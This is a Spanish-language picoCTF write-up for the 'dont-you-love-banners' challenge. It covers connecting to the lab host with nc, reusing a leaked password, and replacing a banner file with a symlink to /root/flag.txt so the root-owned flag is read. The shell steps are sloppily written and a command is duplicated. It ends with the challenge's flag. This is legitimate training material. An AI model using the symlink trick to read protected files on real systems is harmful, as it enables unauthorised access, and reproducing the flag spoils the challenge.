#### Description

[](https://github.com/JazSparrow/Hacking-notes-2025/blob/main/Hacking-notes-2025/PicoCTF/Primer%20Examen%20Parcial/Parte%201%20-%20General%20Skills/07_dont-you-love-banners.md#description)

Can you abuse the banner? The server has been leaking some crucial information on `tethys.picoctf.net 51160`. Use the leaked information to get to the server. To connect to the running application use `nc tethys.picoctf.net 50616`. From the above information abuse the machine and find the flag in the /root directory.

## Hints 1 2

[](https://github.com/JazSparrow/Hacking-notes-2025/blob/main/Hacking-notes-2025/PicoCTF/Primer%20Examen%20Parcial/Parte%201%20-%20General%20Skills/07_dont-you-love-banners.md#hints-1-2)

- Do you know about symlinks?
- Maybe some small password cracking or guessing

## Solución

[](https://github.com/JazSparrow/Hacking-notes-2025/blob/main/Hacking-notes-2025/PicoCTF/Primer%20Examen%20Parcial/Parte%201%20-%20General%20Skills/07_dont-you-love-banners.md#soluci%C3%B3n)

Primero iniciamos nuestra instancia, una vez echo esto, nos dirigimos a nuestra terminal de ubuntu o el webshell de PicoCTF, e ingresamos el **primer `tethyns`** el cual es el: `tethys.picoctf.net 51160` y nos da nuestra contraseña que utilizaremos para la segunda `tethyns` y después damos `crt c`, enseguida ponemos el **segundo `nc tethyns`** en este caso es el: `nc tethys.picoctf.net 50616` y ponemos la contraseña que anteriormente nos dieron el cual es: `My_Passw@rd_@1234` y con esto estaremos dentro.

Una vez ahí ingresamos `ls -al` para ver los archivos que contiene.

Después ingresamos los siguientes comandos:

- cat text
- ls -al /root
- cat /root
- cat /root/script.py
- rm /home/player/banner
- ln -s /root/flag.txt /home/player/banner ln -s /root/flag.txt /home/player/banner

Cuando se terminen de ingresar los comandos en orden, damos un `crt C`.

Y por ultimo ingresamos este ultimo comando, que es nuestro :

- `nc tethys.picoctf.net 50616` El cual nos mostrara nuestra respectiva flag.

````
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}
`````


